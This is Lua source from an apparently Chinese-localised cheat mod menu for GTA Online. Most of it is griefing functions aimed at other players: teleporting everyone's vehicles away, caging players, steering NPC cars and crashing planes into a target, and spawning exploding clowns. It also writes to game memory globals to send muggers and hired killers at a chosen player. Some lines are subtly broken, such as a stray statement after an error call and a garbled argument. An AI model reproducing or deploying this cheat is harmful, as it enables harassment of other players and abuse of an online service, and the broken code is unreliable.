        ENTITY.SET_ENTITY_INVINCIBLE(Lsdcar, true)
        WIRI_VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(Lsdcar, false)
        SFlsd()
        end
    end)
end

local shoot_from_vehicle_Lazer_Space_Car = function (vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
    local min, max = v3.new(), v3.new()
    local offset
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
    if position == 0 then
        offset = v3.new(min.x + 0.3, max.y + 0.25, 0.5)
    elseif position == 1 then
        offset = v3.new(min.x + 0.3, min.y + 4, 0.5)
    elseif position == 2 then
        offset = v3.new(max.x - 0.3, max.y + 0.25, 0.5)
    elseif position == 3 then
        offset = v3.new(max.x - 0.3, min.y + 4, 0.5)
    else
        error("got unexpected position")offset = v3.new(min.x + 0.25, max.y, 0.5)
    end
    local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y - 3.15, offset.z + 1.05)
    local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
    if get_vehicle_cam_relative_heading(vehicle) > 95.0 then
        direction:mul(-1)
    end
    local b = v3.new(direction)
    b:mul(300.0); b:add(a)

    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
        a.x, a.y, a.z,
        b.x, b.y, b.z - 15,
        damage,
        true,
        weaponHash,
        ownerPed,
        isAudible,
        not isVisible,
        speed,
        vehicle,
        false, false, target, false, 0, 0, 0
    )
end

function spawnspecialcar()
    Streament(charger.charg)
    Streament(charger.emp)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)

        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                util.toast('不要在室内生成道奇战马')
            end
            menu.set_value(Spawn, false)
            return
        end

    if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            util.toast('去他妈的上一辆车,已为您更换新的')
        end
        Ccreate(pCoor, pedSi)

        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==true then
            Magout()
        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false then
                Ccreate(pCoor, pedSi)
                 if set.alert then
                    util.toast('道奇战马已生成')
                 end
        end

if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar , false) ==false
            then
            if set.alert then
            util.toast('玩家已离开道奇战马并已被删除')
            end
            menu.set_value(Spawn, false)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(FFchar)
            entities.delete_by_handle(FFchar)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Empa)
            entities.delete_by_handle(Empa)
            menu.delete(Mag_int)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.charg)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.emp)
            util.stop_thread()
            end
            end

function Lazer_Space_Car()
    Streament(lsd.hash)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)

        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                util.toast('魔幻激光战马不会在内部生成')
            end
            menu.set_value(SDspawn, false)
            return
        end
    if PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            util.toast('已为您更换新的战马')
        end
        for i = 1, 1 do
            SDcreate(pCoor, pedSi)
        end

        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, true) ==true then
            local weap = util.joaat(lsd.weap)
            WEAPON.REQUEST_WEAPON_ASSET(weap)
        
            if not ENTITY.DOES_ENTITY_EXIST(Lsdcar) or not PAD.IS_CONTROL_PRESSED(0, 86)
            then
                return
            elseif get_vehicle_cam_relative_heading(Lsdcar) < 95.0 then
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 0)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 2)
            else
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 1)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 3)
            end


        elseif WIRI_PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false and not WIRI_ENTITY.DOES_ENTITY_EXIST(Lsdcar) then
            SDcreate(pCoor, pedSi)
                 if set.alert then
                    util.toast('生成了魔幻激光战马')
                 end
        end

if WIRI_PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and WIRI_PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar , false) ==false
            then
                if set.alert then
                    util.toast('玩家已离开魔幻激光战马，它已被删除')
                end
              menu.set_value(SDspawn, false)
              STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(lsd.hash)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Lsdcar)
              entities.delete_by_handle(Lsdcar)
              menu.delete(Lsd_w)
              util.stop_thread()
            end
        end




function forcecmsoncar()
    if PAD.IS_CONTROL_PRESSED(46, 46) then
        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), math.random(-5, 5), -30.0, math.random(-5, 5))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 100.0)
    end
end

tesla_ped = 0
function teslasummoncar()
    lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
    if lastcar ~= 0 then
        local plyr = PLAYER.PLAYER_PED_ID()
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 5.0, 0.0)
        local phash = -67533719
        request_model_load(phash)
        tesla_ped = entities.create_ped(32, phash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
        tesla_blip = HUD.ADD_BLIP_FOR_ENTITY(tesla_ped)
        HUD.SET_BLIP_COLOUR(tesla_blip, 7)
        ENTITY.SET_ENTITY_VISIBLE(tesla_ped, false, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(tesla_ped, 0, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(lastcar, true)
        PED.SET_PED_INTO_VEHICLE(tesla_ped, lastcar, -1)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ped, lastcar, coords['x'], coords['y'], coords['z'], 300.0, 786996, 5)
    end
end

player_cur_car = 0
function carlshormspam()
    if player_cur_car ~= 0 and  PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        VEHICLE.SET_VEHICLE_MOD(player_cur_car, 14, math.random(0, 51), false)
        PAD._SET_CONTROL_NORMAL(2, 86, 1.0)
        wait(50)
        PAD._SET_CONTROL_NORMAL(2, 86, 0.0)
    end
end

function tm02fastshot()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("请先驾驶TM-02 可汗贾利.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end

function setcardirty(s)
    if player_cur_car ~= 0 then
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(player_cur_car, s)
    end
end

function setstacky(s)
    if player_cur_car ~= 0 then
        old_veh = player_cur_car
        for i=1, s do
            local c = ENTITY.GET_ENTITY_COORDS(old_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(player_cur_car)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(old_veh, 0)
            new_veh = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(old_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(new_veh, old_veh, 0, 0.0, 0.0, size.z, 0.0, 0.0, 0.0, true, false, falsmy_e, false, 0, true)
            old_veh = new_veh
        end
    end
end

function setstackx(s)
    if player_cur_car ~= 0 then
        for i=1, s do
            main_veh = player_cur_car
            local c = ENTITY.GET_ENTITY_COORDS(main_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(main_veh)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(main_veh, 0)
            left_new = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(left_new, main_veh, 0, -size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
            right_new = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(right_new, main_veh, 0, size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
        end
    end
end



function forceteleplace()
    menu.action(apforcedacts_root, "传送载具到航路点", {"tpavtoway"}, "这可能有效，也可能无效。如果这不起作用，它不是一个bug", function(on_click)
        local c = get_waypoint_coords()
        if c ~= nil then
            tp_all_player_cars_to_coords(c)
        end
    end)
    
    menu.action(apforcedacts_root, "传送载具到花园银行直升机停机坪", {"tpavtomaze"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -75.261375
        c.y = -818.674
        c.z = 326.17517
        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到深海底", {"tpavunderwater"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 4497.2207
        c.y = 8028.3086
        c.z = -32.635174
        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到高空", {"tpahigh"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -75
        c.y = -818
        c.z = 2400
        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到洛圣都改车王", {"tpavlsc"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -353.84512
        c.y = -135.59108
        c.z = 39.009624
        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到监狱SCP-173单元", {"tpavscp"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 1642.8401
        c.y = 2570.7695
        c.z = 45.564854
        tp_all_player_cars_to_coords( c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到大牢房中", {"tpavcell"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 1737.1896
        c.y = 2634.897
        c.z = 45.56497
        tp_all_player_cars_to_coords(c)
    end)
end

--广告机拦截
file_name = filesystem.scripts_dir() .. '\\GTLuaScript\\'..'AnTi_Adword.txt'
banned_words = {}

function file_exists(path)
    local file = io.open(path, "rb")
    if file then file:close() end
    return file ~= nil
end

if not file_exists(file_name) then
  util.toast(file_name .. ' was not found, please make sure the script is installed correctly.')
  util.stop_script()
else
    file = io.open(file_name, "r")
    i = 0
    for l in file:lines() do
        i = i + 1
        banned_words[i] = string.lower(l)
    end
    file:close()
end

function Streament(hash)
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    wait()
    end
end

function Delcar(vic, spec, pid)
    if PED.IS_PED_IN_ANY_VEHICLE(vic) ==true then
        local tarcar = PED.GET_VEHICLE_PED_IS_IN(vic, true)
        GetControl(tarcar, spec, pid)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(tarcar)
        entities.delete_by_handle(tarcar)
    end
end

function Pedspawn(pedhash, tar1)
    Streament(pedhash)
    local pedS = entities.create_ped(1, pedhash, tar1, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(pedS, true)
    ENTITY.FREEZE_ENTITY_POSITION(pedS, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pedS, true)
    PED.SET_PED_CAN_LOSE_PROPS_ON_DAMAGE(pedS, false)
    if pedhash == util.joaat('ig_lestercrest') then
        PED.SET_PED_PROP_INDEX(pedS, 1)
    end

    return pedS
end

function SetPedCoor(pedS, tarx, tary, tarz)
    ENTITY.SET_ENTITY_COORDS(pedS, tarx, tary, tarz, false, true, true, false)
end

function Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
    util.create_tick_handler (function ()
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p2, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p3, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p4, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p5, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p6, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p7, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p8, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        wait(100)
        end)
end



function Jesuslovesyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'BUMP', 'JESSE', 'SPEECH_PARAMS_FORCE', 1)
            wait(250)
        end
    end)
end

function Trevortime(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'TR2_ABAJ', 'TREVOR', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end
    end)
end

function Fuckyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_FUCK_YOU', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end
    end)
end

function Provoke(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Provoke_Trespass', 'Speech_Params_Force_Shouted_Critical', 1)
            wait(100)
        end

    end)
end

function JuggleCar(Vehj_h, tar1,  invisjugc, jugr)
    local  CC = VEHICLE.CREATE_VEHICLE(Vehj_h, tar1.x, tar1.y, tar1.z - 5.0, 0, true, true, false)
    if invisjugc then
     ENTITY.SET_ENTITY_VISIBLE(CC, false, 0)
 end
     ENTITY.SET_ENTITY_INVINCIBLE(CC, true)
     ENTITY.SET_ENTITY_VELOCITY(CC, 0, 0, 1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(CC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(CC, true)
     wait(jugr)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(CC)
     entities.delete_by_handle(CC)
end

function Insulthigh(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Generic_Insult_High', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end
    end)
end

function Warcry(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_WAR_CRY', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end

    end)
end

function Streamanim(anim) --Streaming Model
    STREAMING.REQUEST_ANIM_DICT(anim)
    while STREAMING.HAS_ANIM_DICT_LOADED(anim) ==false do
        STREAMING.REQUEST_ANIM_DICT(anim)
        wait()
    end
end

function Runanim(ent, animdict, anim)
    TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
    while ENTITY.IS_ENTITY_PLAYING_ANIM(ent, animdict, anim, 3) ==false do
        TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
        wait()
    end
end

function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end

function PFP(pedm, playerm)--Ped Facing Player adapted from PhoenixScript
    local ppos = ENTITY.GET_ENTITY_COORDS(playerm)
    local pmpos = ENTITY.GET_ENTITY_COORDS(pedm)
    local hx = ppos.x - pmpos.x
    local hy = ppos.y - pmpos.y
    local head = MISC.GET_HEADING_FROM_VECTOR_2D(hx, hy)
    return ENTITY.SET_ENTITY_HEADING(pedm, head)
end

function DelEnt(ped_tab)
    for _, Pedm in ipairs(ped_tab) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Pedm)
        entities.delete_by_handle(Pedm)
    end
end

function Stopsound()
    for i = 0, 99 do
        AUDIO.STOP_SOUND(i)
    end
end

function StandUser(pid)
    if players.exists(pid) and pid ~= players.user() then
        for _, cmd in ipairs(menu.player_root(pid):getChildren()) do
            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and (cmd:refByRelPath("Stand User"):isValid() or cmd:refByRelPath("Stand User (Co-Loading"):isValid()) then
                return true
            end
        end
    end
    return false
end

function IPM(targets, tar1, pname, cage_table, pid)
    local tar2 = ENTITY.GET_ENTITY_COORDS(targets)
    local disbet = GENERIC_SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, tar1.x, tar1.y, tar1.z)
    if disbet <= 0.5  then
    if set.alert then
        util.toast(pname..' 已被笼子困住')
    end
    wait(800)

    elseif disbet >= 0.5  then
    wait(800)
    if set.alert then
        util.toast(pname..' 挣脱了笼子')
    end
    DelEnt(cage_table[pid])
    cage_table[pid] = false
    Stopsound()
    end
end


function CombineTables(table1, table2, table3, table4, table5, table6, table7, table8, table9, table10, table11, result)
	for _, v in ipairs(table1) do
		table.insert(result, v)
	end
	for _, v in ipairs(table2) do
		table.insert(result, v)
	end
    for _, v in ipairs(table3) do
		table.insert(result, v)
	end
	for _, v in ipairs(table4) do
		table.insert(result, v)
	end
    for _, v in ipairs(table5) do
		table.insert(result, v)
	end
	for _, v in ipairs(table6) do
		table.insert(result, v)
	end
    for _, v in ipairs(table7) do
		table.insert(result, v)
	end
	for _, v in ipairs(table8) do
		table.insert(result, v)
	end
    for _, v in ipairs(table9) do
		table.insert(result, v)
	end
	for _, v in ipairs(table10) do
		table.insert(result, v)
	end
    for _, v in ipairs(table11) do
		table.insert(result, v)
	end

end

function ObjFrezSpawn(hsel, tar1)
    local objHash = hsel
  local objfS =  OBJECT.CREATE_OBJECT(objHash, tar1.x, tar1.y, tar1.z, true, true, true)
  ENTITY.FREEZE_ENTITY_POSITION(objfS, true)
  return objfS
end

function SetObjCo(objS, tarx, tary, tarz)
    SEC(objS, tarx, tary, tarz, false, true, true, false)
end

function planedied(pid, index, plane)
    local hash <const> = util.joaat(plane)
    request_model(hash)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = get_random_offset_from_entity(targetPed, 20.0, 20.0)
    pos.z = pos.z + 30.0
    local plane = entities.create_vehicle(hash, pos, 0.0)
    set_entity_face_entity(plane, targetPed, true)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
    VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
end

function nearcarkill(pid)
    if not is_player_active(pid, false, true) then
        return util.stop_thread()
    end
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for _, vehicle in ipairs(get_vehicles_in_player_range(pid, 70.0)) do
        if TASK.GET_ACTIVE_VEHICLE_MISSION_TYPE(vehicle) ~= 6 then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
            if ENTITY.DOES_ENTITY_EXIST(driver) and not PED.IS_PED_A_PLAYER(driver) then
                request_control_once(driver)
                PED.SET_PED_MAX_HEALTH(driver, 300)
                ENTITY.SET_ENTITY_HEALTH(driver, 300, 0)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 100.0, 0, 0.0, 0.0, true)
            end
        end
    end
end

function creep(pid)
    local hash <const> = util.joaat("s_m_y_clown_01")
		local explosion <const> = Effect.new("scr_rcbarry2", "scr_exp_clown")
		local appears <const> = Effect.new("scr_rcbarry2",  "scr_clown_appears")
		request_model(hash)
		local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player, false)
		local coord = get_random_offset_from_entity(player, 5.0, 8.0)
		coord.z = coord.z - 1.0
		local ped = entities.create_ped(0, hash, coord, 0.0)

		request_fx_asset(appears.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(appears.asset)
		WIRI_GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			appears.name,
			ped,
			0.0, 0.0, -1.0,
			0.0, 0.0, 0.0,
			0.5, false, false, false
		)
		set_entity_face_entity(ped, player, false)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
		TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, pos.x, pos.y, pos.z, 5.0, 0, false, 0, 0.0)
		local dest = pos
		PED.SET_PED_KEEP_TASK(ped, true)
		AUDIO.STOP_PED_SPEAKING(ped, true)
		util.create_tick_handler(function()
			local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
			local targetPos = players.get_position(pid)
			if not ENTITY.DOES_ENTITY_EXIST(ped) or PED.IS_PED_FATALLY_INJURED(ped) then
				return false
			elseif pos:distance(targetPos) > 150 and
			request_control(ped) then
				entities.delete_by_handle(ped)
				return false
			elseif pos:distance(targetPos) < 3.0 and request_control(ped) then
				request_fx_asset(explosion.asset)
				GRAPHICS.USE_PARTICLE_FX_ASSET(explosion.asset)
				WIRI_GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					explosion.name,
					pos.x, pos.y, pos.z,
					0.0, 0.0, 0.0,
					1.0,
					false, false, false, false
				)
				FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, true, 1.0, false)
				ENTITY.SET_ENTITY_VISIBLE(ped, false, false)
				entities.delete_by_handle(ped)
				return false
			elseif targetPos:distance(dest) > 3.0 and request_control_once(ped) then
				dest = targetPos
				TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, targetPos.x, targetPos.y, targetPos.z, 5.0, 0, false, 0, 0.0)
			end
		end)
    end

function sendmugger_npc(pid)
    if NETWORK.NETWORK_IS_SESSION_STARTED() and is_player_active(pid, true, true) and
    not is_player_in_interior(pid) then

        if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
            local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
            memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 0))
            write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
        else
            notification("劫匪已经开始活动", HudColour.red)
        end
    end
end

function sendkiller(pid)
    if NETWORK.NETWORK_IS_SESSION_STARTED() and is_player_active(pid, true, true) and
    not is_player_in_interior(pid) then

        if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 1, true, 0) then
            local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
            memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 1))
            write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
        else
            notification("雇佣兵已经开始活动", HudColour.red)
        end
    end
end

local fps = 0
util.create_thread(function()
    while true do
        fps = math.ceil(1/SYSTEM.TIMESTEP())
        wait(500)
    end
end)

function xianshijiaoben(state)
jiaoben_x = 0.42
jiaoben_y = 0
jiaoben_dx = 0.45
sname = state
while sname do
if mcxh==1 and mcg<256 then
HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	
if mcg == 255 then
mcxh=2
else
mcg=mcg+1
end
elseif mcxh==2 and mcr>-1 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcr == 0 then
mcxh=3
else
mcr=mcr-1
end
elseif mcxh==3 and mcb<256 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcb == 255 then
mcxh=4
else
mcb=mcb+1
end
elseif mcxh==4 and mcg>-1 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcg == 0 then
mcxh=5
else
mcg=mcg-1
end
elseif mcxh==5 and mcr<256 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcr == 255 then
mcxh=6
else
mcr=mcr+1
end
elseif mcxh==6 and mcb>-1 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcb == 0 then
mcxh=1
else
mcb=mcb-1
end
end
draw_string(string.format("~italic~              ¦&#8721;\n    ~h~GRANDTOURINGVIP\n         Version : " ..GT_version), jiaoben_x,jiaoben_y, jiaoben_dx,4.5)
wait()
end
end    

function xianshijiaoben2(state)
sname = state
while sname do
if mcxh==1 and mcg<256 then
HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	
if mcg == 255 then
mcxh=2
else
mcg=mcg+1
end
elseif mcxh==2 and mcr>-1 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcr == 0 then
mcxh=3
else
mcr=mcr-1
end
elseif mcxh==3 and mcb<256 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcb == 255 then
mcxh=4
else
mcb=mcb+1
end
elseif mcxh==4 and mcg>-1 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcg == 0 then
mcxh=5
else
mcg=mcg-1
end
elseif mcxh==5 and mcr<256 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcr == 255 then
mcxh=6
else
mcr=mcr+1
end
elseif mcxh==6 and mcb>-1 then
HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
if mcb == 0 then
mcxh=1
else
mcb=mcb-1
end
end
draw_string(string.format("\n\n   ~italic~~h~".. PLAYER.GET_PLAYER_NAME(players.user())..""), 0.40,0, 0.45,4.5)
wait()
end
end

function STAT_GET_FLOAT(Stat)
    local FloatPTR = memory.alloc(4)

    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_FLOAT(util.joaat(Stat), FloatPTR, -1)
    else
        STATS.STAT_GET_FLOAT(util.joaat(MP_INDEX() .. Stat), FloatPTR, -1)
    end

    return tonumber(string.format("%.3f", memory.read_float(FloatPTR)))
end
function TELEPORT(X, Y, Z)
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), X, Y, Z)
end
function cshj()
    if STAT_GET_INT("IH_SUB_OWNED") == 0 then
        NOTIFY(TRANSLATE("You have not bought Kosatka yet. Buy it first to teleport!"))
    else
        TELEPORT(1561.2369, 385.8771, -49.689915)
        SET_HEADING(175)
    end
end
function SET_HEADING(Heading)
    ENTITY.SET_ENTITY_HEADING(players.user_ped(), Heading)
end
function STAT_GET_BOOL(Stat)
    local BoolPTR = memory.alloc(1)

    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_BOOL(util.joaat(Stat), BoolPTR, -1)
    else
        STATS.STAT_GET_BOOL(util.joaat(MP_INDEX() .. Stat), BoolPTR, -1)
    end

    if memory.read_byte(BoolPTR) == 1 then
        return "true"
    else
        return "false"
    end
end
local function get_random_joke()
    local joke = 'WIP'
    local in_progress = true
